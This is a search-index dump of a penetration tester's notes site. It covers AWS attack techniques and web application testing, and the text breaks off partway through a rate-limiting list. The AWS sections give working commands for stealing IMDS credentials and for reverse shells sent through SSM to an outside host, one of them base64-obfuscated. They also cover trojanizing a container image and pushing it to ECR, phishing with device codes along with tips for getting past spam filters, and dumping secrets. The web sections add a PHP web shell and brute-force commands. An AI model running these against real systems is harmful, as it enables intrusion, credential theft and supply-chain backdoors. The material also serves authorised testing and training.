{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"$ whoami","text":""},{"location":"#jacob-hammargren","title":"Jacob Hammargren","text":"<p>\ud83d\udcbc LinkedIn       | \ud83d\udda5\ufe0f GitHub   | \ud83d\udcdc Resume  | \u2709\ufe0f Email</p>"},{"location":"#industry-certifications","title":"Industry Certifications","text":"Offensive Security Certified Professional (OSCP) Certified Penetration Testing Specialist (CPTS) Certified Red Team Operator (CRTO) Offensive AWS Security Professional Practical Web Pentest Associate (PWPA) Genesis Prolab Practical Network Penetration Tester Practical Junior Penetration Tester Certified Defensive Security Analyst Security+"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Authenticate/","title":"Authenticate","text":"<p>Authenticate to AWS with:</p> <pre><code>aws configure\n</code></pre> <p>OR env variables (if you\u2019re authing as a resource)</p> <pre><code>rm -rf ./aws\n</code></pre> <pre><code>export AWS_ACCESS_KEY_ID=&lt;token&gt;\nexport AWS_SECRET_ACCESS_KEY=&lt;token&gt;\nexport AWS_SESSION_TOKEN=&lt;token&gt;\n</code></pre> <p>OR</p> <pre><code>aws configure #add access and secret\naws configure set aws_session_token \"&lt;session token&gt;\"\n</code></pre> <p>Unset once you are done</p> <pre><code>unset AWS_ACCESS_KEY_ID\nunset AWS_SECRET_ACCESS_KEY\nunset AWS_SESSION_TOKEN\n</code></pre>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/","title":"Compute Services & Lateral Movement","text":"<p>Exploit misconfigurations in EC2 metadata, SSM, or user-data to gain code execution or extract credentials.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/#instance-metadata-service-imds-enumeration","title":"Instance Metadata Service (IMDS) Enumeration","text":"<p>IMDSv1 (Unauthenticated Requests) <pre><code>curl http://169.254.169.254/latest/meta-data/\ncurl http://169.254.169.254/latest/meta-data/hostname\ncurl http://169.254.169.254/latest/meta-data/ami-id\ncurl http://169.254.169.254/latest/meta-data/instance-type\ncurl http://169.254.169.254/latest/meta-data/public-ipv4\ncurl http://169.254.169.254/latest/meta-data/security-groups\ncurl http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name\n</code></pre> If a role is attached and has broad permissions (e.g., <code>AllowEC2ToReadSecrets</code>), you can retrieve secrets directly: <pre><code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets\n</code></pre> IMDSv2 (Token-Based Access) <pre><code>TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" \\\n     http://169.254.169.254/latest/meta-data/iam/security-credentials/AllowEC2ToReadSecrets\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/#ec2-user-data-enumeration","title":"EC2 User Data Enumeration","text":"<p>Pull user data from all instances: <pre><code># userDataEnum.sh\n#!/bin/bash\n\ninstance_ids=$(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text)\nfor instance_id in $instance_ids; do\n    echo \"Getting userData for instance: $instance_id\"\n    user_data=$(aws ec2 describe-instance-attribute \\\n        --instance-id \"$instance_id\" \\\n        --attribute userData --output text 2&gt;/dev/null)\n    if [ -n \"$user_data\" ]; then\n        # Strip \"USERDATA\" prefix, then base64-decode\n        user_data=$(echo \"$user_data\" | sed 's/^USERDATAs*//' | sed '1d' | sed 's/^[[:space:]]*//')\n        echo \"Base64-encoded userData for $instance_id:\"\n        echo \"$user_data\"\n        echo \"Decoded userData for $instance_id:\"\n        echo \"$user_data\" | base64 -d\n    else\n        echo \"No userData for $instance_id\"\n    fi\n    echo \"-----------------------------------------\"\ndone\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Compute%20Services%20%26%20Lateral%20Movement/#aws-systems-manager-ssm-command-execution","title":"AWS Systems Manager (SSM) Command Execution","text":"<p>Check for SSM perms <pre><code>aws iam list-attached-user-policies --user-name &lt;USERNAME&gt;\n</code></pre> If you find a policy ARN such as <code>AllowSSMRunShellCommands</code>, retrieve its document: <pre><code>aws iam get-policy --policy-arn arn:aws:iam::&lt;ACCOUNT_ID&gt;:policy/AllowSSMRunShellCommands\naws iam get-policy-version \\\n  --policy-arn arn:aws:iam::&lt;ACCOUNT_ID&gt;:policy/AllowSSMRunShellCommands \\\n  --version-id v1\n</code></pre> Look for <code>\"ssm:SendCommand\"</code> in the document\u2019s <code>\"Statement\"</code> and note which targets (e.g., <code>\"Resource\": [\"arn:aws:ec2:us-east-1:&lt;ACCOUNT_ID&gt;:instance/i-0abcd1234\"]</code>) are allowed. Send a Command via SSM (Assuming Permissions Exist) <pre><code>aws ssm send-command \\\n  --instance-ids \"i-0abcd1234\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"ReverseShell\" \\\n  --parameters '{\"commands\":[\"bash -c \\'bash -i &gt;&amp; /dev/tcp/10.0.10.100/8443 0&gt;&amp;1\\'\"]}' \\\n  --output text\n</code></pre> If you need to base64-encode the payload to avoid shell\u2010quoting issues: <pre><code>PAYLOAD=$(echo \"bash -i &gt;&amp; /dev/tcp/10.0.10.100/8443 0&gt;&amp;1\" | base64)\naws ssm send-command \\\n  --instance-ids \"i-0abcd1234\" \\\n  --document-name \"AWS-RunShellScript\" \\\n  --comment \"ReverseShell\" \\\n  --parameters \"{\\\"commands\\\":[\\\"echo $PAYLOAD | base64 -d | bash\\\"]}\" \\\n  --output text\n</code></pre> Debug a Failed SSM Invocation: <pre><code>aws ssm list-command-invocations \\\n  --instance-id \"i-0abcd1234\" \\\n  --command-id \"cb542971-efb0-4f08-9281-9ca010a4c0ef\" \\\n  --details\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Credential%20%26%20Identity%20Attacks/","title":"Credential & Identity Attacks","text":"<p>Target IAM roles, policies, or SSO flows to obtain or elevate privileges. Generate &amp; Retrieve IAM Credential Report <pre><code>aws iam generate-credential-report\naws iam get-credential-report\n</code></pre> Retrieve All Roles You Can Assume <pre><code>aws iam get-account-authorization-details\n</code></pre> Review the <code>RoleDetailList</code> section for roles where you have <code>sts:AssumeRole</code> permissions. Confused Deputy / Role Chaining <pre><code>aws iam get-account-authorization-details\n</code></pre> Look for trust policies that allow <code>sts:AssumeRole</code> from an external account or cross-service trust. If you can assume a higher-privilege role in another account (Confused Deputy), you can pivot to that role.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/","title":"Discovery & Reconnaissance","text":"<p>Map out accounts, services, regions, and resources that exist in the target AWS environment.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#region-enumeration","title":"Region Enumeration","text":"<p>With Pacu <pre><code>&gt;&gt; run general__enum_regions\n</code></pre> AWS CLI <pre><code>aws ec2 describe-regions\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#iam-enumeration-credential-reporting","title":"IAM Enumeration &amp; Credential Reporting","text":"<p>Check password age, MFA enabled, access keys still active <pre><code>aws iam generate-credential-report\naws iam get-credential-report\n</code></pre> List All Roles &amp; Policies (find which IAM roles/users you can assume or attach): <pre><code>aws iam get-account-authorization-details \\\n  --output json \\\n  --query '{Roles:Roles, Users:UserDetailList}'\n</code></pre> Check Attached Policies <pre><code>aws iam list-user-policies --user-name &lt;USERNAME&gt;\naws iam list-attached-user-policies --user-name &lt;USERNAME&gt;\naws iam get-user-policy --user-name &lt;USERNAME&gt; --policy-name &lt;POLICY_NAME&gt;\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#ec2-ebs-enumeration","title":"EC2 &amp; EBS Enumeration","text":"<p>List EC2 Instances <pre><code>aws ec2 describe-instances\n</code></pre> List EBS Volumes <pre><code>aws ec2 describe-volumes\n</code></pre> List EBS Snapshots (All &amp; By Owner) <pre><code># All snapshots in a region\naws ec2 describe-snapshots --region us-east-1\n\n# Snapshots owned by a specific account\naws ec2 describe-snapshots --region us-east-1 --owner-ids &lt;ACCOUNT_ID&gt;\n</code></pre> Automate EC2 / EBS Enumeration with Pacu** <pre><code>&gt;&gt; run ebs__enum_volumes_snapshots\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#s3-bucket-discovery-interaction","title":"S3 Bucket Discovery &amp; Interaction","text":"<p>List All Buckets (If You Have Permissions) <pre><code>aws s3api list-buckets\n</code></pre> Automated Public Bucket Discovery (no auth) <pre><code>cloud_enum -k &lt;keyword&gt; -t 10 --disable-azure --disable-gcp\n</code></pre> FInd buckets with Google dorks <pre><code>site:.s3.amazonaws.com \"&lt;Target_Company&gt;\"\n\"Intitle:index.of.bucket\" \"&lt;Target_Company&gt;\"\n</code></pre> List Objects in a Bucket <pre><code>aws s3 ls s3://&lt;bucket-name&gt;\n</code></pre> Sync Entire Bucket Locally <pre><code>aws s3 sync s3://&lt;bucket-name&gt; .\n</code></pre> If Blocked / Rate-Limited (Use s3api) <pre><code>aws s3api get-object --bucket \"&lt;bucket-name&gt;\" --key \"&lt;object-key&gt;\" \"&lt;local-output&gt;\"\n</code></pre> List Object Versions (When Versioning Is Enabled) <pre><code>aws s3api list-object-versions --bucket &lt;bucket-name&gt;\n</code></pre> Dump All Object Versions via Script <pre><code># DumpObjectVersions.sh\nread -p \"Enter the S3 bucket name: \" BUCKET_NAME\nread -p \"Enter the local dir path where data will be saved: \" LOCAL\nobject_versions=$(aws s3api list-object-versions --bucket \"$BUCKET_NAME\" --no-sign-request | jq -c '.Versions[]')\nwhile IFS= read -r object_version; do\n    key=$(echo \"$object_version\" | jq -r '.Key')\n    version_id=$(echo \"$object_version\" | jq -r '.VersionId')\n    if [ -n \"$key\" ] &amp;&amp; [ \"$version_id\" != \"null\" ]; then\n        LOCAL_DIR=\"$LOCAL$key\"\n        mkdir -p \"$(dirname \"$LOCAL_DIR\")\"\n        aws s3api get-object --bucket \"$BUCKET_NAME\" \\\n          --no-sign-request \\\n          --key \"$key\" \\\n          --version-id \"$version_id\" \\\n          \"$LOCAL_DIR\"\n    fi\ndone &lt;&lt;&lt; \"$object_versions\"\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#serverless-api-enumeration","title":"Serverless &amp; API Enumeration","text":"<p>List All Lambda Functions <pre><code>aws lambda list-functions\n</code></pre> Get Detailed Info for a Lambda <pre><code>aws lambda get-function --function-name &lt;function-name&gt;\n</code></pre> Retrieve a Lambda\u2019s Deployment Package (ZIP) copy the <code>\"Location\"</code> URL from <code>aws lambda get-function</code> output, download lambda: <pre><code>curl \"&lt;Location_URL&gt;\" -o lambda.zip\n</code></pre> Discover API Gateway Endpoints <pre><code>aws apigateway get-rest-apis\n</code></pre> From the returned ARN (<code>arn:aws:execute-api:&lt;region&gt;:&lt;account&gt;:&lt;api-id&gt;/*/*</code>), build the public invoke URL: <pre><code>https://&lt;api-id&gt;.execute-api.&lt;region&gt;.amazonaws.com\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#container-services-enumeration","title":"Container Services Enumeration","text":"<p>List ECR Repositories <pre><code>aws ecr describe-repositories\n</code></pre> List Images in a Specific Repository <pre><code>aws ecr describe-images --repository-name &lt;repo-name&gt;\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Discovery%20%26%20Reconnaissance/#backdoor-an-image-with-dockerscan","title":"Backdoor an Image with Dockerscan","text":"<p>install https://github.com/cr0hn/dockerscan <pre><code>git clone https://github.com/cr0hn/dockerscan\ncd dockerscan\nsudo python3.6 setup.py install\n</code></pre> Pull an existing image (Ubuntu as an example) <pre><code>docker pull ubuntu:latest\ndocker save ubuntu:latest -o ubuntu_original\n</code></pre> Trojanize it <pre><code>dockerscan image modify trojanize ubuntu_original \\\n  -l &lt;attacker_IP&gt; -p &lt;attacker_PORT&gt; -o alpine_infected\n</code></pre> Tag the infected image as :latest for ECR <pre><code>docker tag alpine_infected:latest \\\n  &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;REPO_NAME&gt;:latest\n</code></pre> Authenticate Docker to ECR <pre><code>aws ecr get-login-password --region &lt;region&gt; | sudo docker login --username AWS --password-stdin &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com\n</code></pre>  Push the backdoored image <pre><code>sudo docker push &lt;AWS_ACCOUNT_ID&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;REPO_NAME&gt;:latest\n</code></pre>  Wait for any running ECS/EKS node to pull and run the new image  Once you have a shell in a compromised pod, look for creds in env vars <code>env</code></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Phishing%20via%20SSO%20Device%20Codes/","title":"Phishing via SSO Device Codes","text":"<p>Exploit AWS SSO device code flows to trick users into authenticating and returning valid tokens. Clone the AWS SSO Device Code Tool <pre><code>git clone https://github.com/christophetd/aws-sso-device-code-authentication\ncd aws-sso-device-code-authentication\n</code></pre> Generate a Device Code URL <pre><code>python main.py \\\n  --sso-start-url https://mycompany.awsapps.com/start \\\n  --sso-region us-east-1 \\\n  --output-file ./sso_token.json\n</code></pre> This will display a URL of the form: <pre><code>https://device.sso.us-east-1.amazonaws.com/?user_code=PPSR-PVFH\n</code></pre> Send that URL to your target (e.g., via email). Once they enter the code, the tool will retrieve an SSO access token.</p> <p>note</p> <p>Ensure your sender domain is unlikely to be flagged as spam. Commonly trusted domains include <code>gmail.com</code>, <code>hotmail.com</code>, <code>yahoo.com</code>, etc.</p> <p>note</p> <p>After the user authenticates, you\u2019ll receive AWS SSO tokens valid for 8 hours, which can be exchanged for AWS credentials.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/","title":"Secrets & Notification Services","text":"<p>Enumerate and exploit Secrets Manager, SNS topics, or other services that may leak sensitive data.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/#secrets-manager-enumeration-exfiltration","title":"Secrets Manager Enumeration &amp; Exfiltration","text":"<p>List All Secrets (if permitted) <pre><code>aws secretsmanager list-secrets --region us-east-1\n</code></pre> Retrieve Secret Values <pre><code>aws secretsmanager get-secret-value \\\n  --secret-id &lt;SecretName&gt; \\\n  --region us-east-1\n</code></pre></p> <p>note</p> <p>If a role or user attached to the instance (via IMDS) has <code>secretsmanager:GetSecretValue</code>, you can retrieve high-value secrets (API keys, database credentials, etc.).</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Secrets%20%26%20Notification%20Services/#simple-notification-service-sns-enumeration","title":"Simple Notification Service (SNS) Enumeration","text":"<p>Identify Topic ARNs If you\u2019ve discovered an SNS topic ARN (e.g., via Secrets Manager or CloudFormation), subscribe to it to intercept messages (which sometimes contain provisioning or \u201conboarding\u201d notifications). <pre><code>aws sns list-topics --region us-east-1\n</code></pre> Subscribe to a topic <pre><code>aws sns subscribe \\\n  --topic-arn arn:aws:sns:us-east-1:&lt;ACCOUNT_ID&gt;:Onboarding_New_Internal_Dev_Msg_01 \\\n  --protocol email \\\n  --notification-endpoint you@example.com \\\n  --region us-east-1\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Serverless%20Services%20Exploitation/","title":"Serverless Services Exploitation","text":"<p>Dive deeper into compromised Lambda functions or API Gateway integrations to exfiltrate code/config or execute payloads.</p> <ol> <li>Enumerate Lambda Functions (see section 3.5).</li> <li>Download &amp; Inspect Deployment Package (ZIP and <code>env</code> variables inside).</li> <li>Identify Hardcoded Secrets or Misconfigurations (e.g., environment variables exposing DB credentials).</li> <li>Check Lambda Function Policy for \u201cInvokeFunction\u201d Permissions <pre><code>aws lambda get-policy --function-name &lt;function-name&gt;\n</code></pre></li> <li>If an API Gateway or SQS/SNS resource has permission to invoke, you can craft requests to trigger the function with malicious payloads.</li> <li>For API Gateway: build the base URL from the ARN returned by <code>get-policy</code> and send HTTP requests to test for command injection or exposed functions.</li> </ol>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/","title":"Storage Enumeration & Exploitation","text":"<p>Once you know which buckets or volumes exist, try to retrieve or tamper with data. (See [[Discovery &amp; Reconnaissance]])</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/#s3-buckets","title":"S3 Buckets","text":"<p>Upload Objects (if the bucket is writable): <pre><code>aws s3 cp &lt;localfile&gt; s3://&lt;bucket-name&gt;/\n</code></pre> Bucket ACL or Policy Misconfiguration <pre><code>aws s3api put-object --bucket &lt;bucket-name&gt; \\\n  --key \"test.txt\" --body \"./test.txt\"\n</code></pre> If it succeeds, the bucket is world-writeable.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Storage%20Enumeration%20%26%20Exploitation/#ebs-snapshot-exploitation","title":"EBS Snapshot Exploitation","text":"<p>Identify accessible snapshots (See [[Discovery &amp; Reconnaissance]]) Use <code>dsnap</code> to download: <pre><code>dsnap --region &lt;region&gt; get &lt;SNAPSHOT_ID&gt;\n</code></pre> Launch a Docker container to mount the disk image: <pre><code>sudo IMAGE=&lt;path/to/snapshot.img&gt; make docker/run\n# Example: sudo IMAGE=./snap-xxxxxx.img make docker/run\n</code></pre> Inspect the mounted filesystem for AWS credentials in <code>~/.aws/credentials</code>, config files, or environment files.</p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/","title":"Tools","text":""},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/#prowler","title":"Prowler","text":"<pre><code>git clone &lt;https://github.com/prowler-cloud/prowler.git&gt;\ncd prowler\npip3 install -r requirements.txt\n</code></pre> <pre><code>aws configure\n</code></pre> <pre><code>./prowler -M html -V\n</code></pre>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/#scoutsuite","title":"Scoutsuite","text":"<p><pre><code>git clone &lt;https://github.com/nccgroup/ScoutSuite.git&gt;\ncd ScoutSuite\npip3 install -r requirements.txt\n</code></pre> <pre><code>python3 scout.py aws --report-dir ./scoutsuite_report --debug\n</code></pre> <pre><code>python3 scout.py aws --list-services\n</code></pre></p>"},{"location":"%E2%98%81%EF%B8%8F%20Cloud/Amazon%20Web%20Services%20%28AWS%29/Tools/#pacu-interactive-aws-attack-framework","title":"Pacu (Interactive AWS Attack Framework)","text":"<p><pre><code>git clone https://github.com/RhinoSecurityLabs/pacu\ncd pacu\npip3 install -r requirements.txt\n</code></pre> <pre><code>python3 pacu.py\n</code></pre> Import credentials (if needed) and enumerate permissions: <pre><code>&gt;&gt; import_keys --all      # Automatically load all AWS credentials from ~/.aws or environment\n&gt;&gt; run iam__enum_permissions\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/","title":"Under Construction","text":"<p>The notes in this section are still being migrated and are incomplete</p> <p>Resources</p> <ul> <li>https://owasp.org/www-project-web-security-testing-guide/</li> <li>https://github.com/muslumsecurity/top25-parameters/tree/main</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/","title":"Insecure File Uploads","text":"<pre><code>&lt;?php system($_GET['cmd']); ?&gt;\n</code></pre>"},{"location":"%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/#client-side","title":"Client-Side","text":"<ul> <li>Intercept request, modify filetype, and filename, and replace data, send modified request</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Insecure%20File%20Uploads/#server-side-bypasses","title":"Server-Side Bypasses","text":"<p>extensions <pre><code>shell.php.png\nshell.php%00.png\nshell.phtml\nshell.inc\nshell.php3\nshell.php4\nshell.php5\n</code></pre> Content-Type <pre><code>kinda useless\n</code></pre> magic bytes https://en.wikipedia.org/wiki/List_of_file_signatures - Intercept request, insert php below magic bytes header, change filetype to php, and send</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Verb%20Tampering/","title":"Verb Tampering","text":"<code>GET</code> The <code>GET</code> method requests a representation of the specified resource. Requests using <code>GET</code> should only retrieve data and should not contain a request content. <code>HEAD</code> The <code>HEAD</code> method asks for a response identical to a <code>GET</code> request, but without a response body. <code>POST</code> The <code>POST</code> method submits an entity to the specified resource, often causing a change in state or side effects on the server.T <code>PUT</code> The <code>PUT</code> method replaces all current representations of the target resource with the request content. <code>DELETE</code> The <code>DELETE</code> method deletes the specified resource. <code>CONNECT</code> The <code>CONNECT</code> method establishes a tunnel to the server identified by the target resource. <code>OPTIONS</code> The <code>OPTIONS</code> method describes the communication options for the target resource. <code>TRACE</code> The <code>TRACE</code> method performs a message loop-back test along the path to the target resource. <code>PATCH</code> The <code>PATCH</code> method applies partial modifications to a resource."},{"location":"%F0%9F%8C%90%20Web%20Application/Web%20Application%20Firewall/","title":"Web Application Firewall","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Web%20Application%20Firewall/#waf-fingerprinting","title":"WAF Fingerprinting","text":"<p>wafw00f <pre><code>wafw00f &lt;URL&gt;\n</code></pre> Input known bad payload to understand WAF response *Input known good payload to understand standard response</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/API/-%20Getting%20Started/","title":"Getting Started","text":"<p>Quick wins</p> <ul> <li>Lack of rate limiting is common for APIs</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/API/API/","title":"API","text":"<p>Post data <pre><code>curl -X POST -k &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre> proxy through burp <pre><code>curl -X POST -k --proxy http://localhost:8080 &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/API/Mass%20Assignment/","title":"Mass Assignment","text":"<p>Certain application will assign values to keys and use them to create an object that encompasses those values. If you can discover controllable inputs (like adding an item to a cart, or checkout flow) you may be able to assign arbitrary values to params you're not supposed to - such as making <code>\"discountPercent\":100</code> etc... to discover potential assignable keys used to build objects. you can:</p> <ul> <li>Discover them in requests</li> <li>Code reveiw</li> <li>Fuzzing</li> <li>API leaking lots of data</li> <li>front end code</li> <li>JWT claims </li> </ul> <p>Once discovered, you can just make a request with the modified params.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Access%20Control/Broken%20Function%20Level%20Access%20%28BLFA%29/","title":"Broken Function Level Access (BLFA)","text":"<p>Using a low privileged users session token, can you perform actions of another user? of a higher privileged user? </p> <p>Use multiple accounts for testing, preferably two user accounts and two admin accounts. Proxy an admin request through burp and execute an admin function, repeat this request but replace the admin session token with the user sessions token. Is the admin function executed?</p> <p>Tip:</p> <p>Utilize the firefox containers addon to maintain sessions across multiple account for ease of use. </p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/","title":"Insecure Direct Object Reference (IDOR)","text":"<p>Similar to Broken Object Level Access (BOLA) but less API focused, for example, iterating a pageID or page directory to view information of other users.</p> <p>ffuf</p> <ul> <li>if you have UIDs (can be anything) <code>-mr</code> = regex match <pre><code>ffuf -u &lt;http://example.com/info.php?account=FUZZ&gt; -w &lt;UIDLIST&gt; -mr 'admin'\n</code></pre></li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20%28IDOR%29/#api","title":"API","text":"<p>Post data <pre><code>curl -X POST -k &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre> proxy through burp <pre><code>curl -X POST -k --proxy http://localhost:8080 &lt;ENDPOINT&gt; -d '{key:\"value\"}'\n</code></pre></p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/-%20Getting%20Started/","title":"Getting Started","text":"<p>General Starting Point</p> <ul> <li>Map entire auth flow / attack surface</li> <li>Proxy requests, target a functionality, step through entire process, then review every step in the chain via the proxy requests.</li> <li>Create multiple accounts for testing</li> <li>Check for brute-force protection</li> <li>Is the application using a standard library?</li> <li>Logic Flaws</li> <li>Inspect tokens</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/-%20Getting%20Started/#wordlist-resources","title":"Wordlist Resources","text":"<ul> <li>https://wordlists.assetnote.io/</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/","title":"Brute Forcing Authentication","text":"<p>ffuf</p> <ul> <li>Save request \u201ccopy to file\u201d from burp - Replace \u201cpassword\u201d param with \u201cFUZZ\u201d</li> <li> <p>Run with no filter, determine invalid response size, add <code>fs &lt;SIZE&gt;</code> , re-run command <pre><code>ffuf -request r.txt -fs &lt;SIZE&gt; -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZ\n</code></pre> fuff - fuzz all permutations of multiple parameters (clusterbomb)</p> </li> <li> <p>Modify the request with two keywords, append them to the proper wordlists <pre><code>ffuf -request r.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER\n</code></pre> hydra <pre><code>hydra -V -L ../wordlists/users.txt -P ../wordlists/pass.txt 192.168.187.133 http-get-form \"/dvwa/vulnerabilities/brute/:username=^USER^&amp;password=^PASS^&amp;Login=Login:F=Username and/or password incorrect.:H=Cookie\\: PHPSESSID=XXXXX; security=low\"\n</code></pre></p> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/#user-enumeration","title":"User Enumeration","text":"<ul> <li>Check if response is different for failed username vs failed password</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Brute%20Forcing%20Authentication/#timing-technique","title":"Timing technique:","text":"<ul> <li>Attempt usernames with an extremely long password<ul> <li>Does the application take longer to check the password when the username is valid? </li> <li>Check response times !</li> </ul> </li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/","title":"Json Web Tokens (JWTs)","text":"<p>Burpsuite \"JWT Editor\" Extension is helpful</p> <p>note</p> <p>When you remove the signature, you usually need to retain the trailing dot.</p> <p>note</p> <p>When testing JWTs, test similar to BFLA and BOLA and IDOR, make two users and see if you can modify user2s information by changing the user claim on the JWT from user1.</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/#signing-attacks","title":"Signing attacks","text":"<ul> <li>Does the application check if the signature has been modified? Can we edit the claims and have them accepted?</li> <li>Can we change the algorithm and sign them ourselves?</li> <li>Does the application check if the token is signed? </li> <li>Can we bruteforce the key?</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/#header-injection","title":"Header Injection","text":"<p>Headers to use in the attack:</p> <ul> <li>JWK (JSON web key)</li> <li>JKU (JSON web key set url)</li> <li>KID (Key ID)</li> </ul> <p>We can potentially inject an arbitrary JSON web key, the application will then use this key to verify subsequent tokens.</p> <ol> <li>Use JWT editor (burp) to create a new RSA key. </li> <li>Modify the web token to the administrator claim.</li> <li>Click \"attack\" --&gt; embed JWK --&gt; select key --&gt; match the signing algo from the original</li> <li>Send to application and verify results.</li> </ol>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Json%20Web%20Tokens%20%28JWTs%29/#tooling","title":"Tooling","text":"<p>https://github.com/ticarpi/jwt_tool Includes a great workflow and a ton of automated exploitation options including cracking tokens. Good resource: https://github.com/ticarpi/jwt_tool/wiki</p>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Multi-Factor%20Authentication/","title":"Multi Factor Authentication","text":"<p>General things to look for:</p> <ul> <li>Forceful Browsing</li> <li>Changing parameters</li> <li>Changing body content</li> <li>Are thing predictable?</li> <li>Backup codes present?</li> <li>Same code, multiple accounts?</li> <li>Can we trigger an error/weird behavior</li> <li>Can you skip steps in the MFA flow?</li> </ul>"},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Rate%20Limiting/","title":"Rate Limiting","text":""},{"location":"%F0%9F%8C%90%20Web%20Application/Authentication/Rate%20Limiting/#identify-rate-limiting-technique","title":"Identify rate limiting technique","text":"<p>Potential:</p> <ul> <li>Headers?</li> <li>User agents?</li> <li>Cookies? Session tokens?</li> 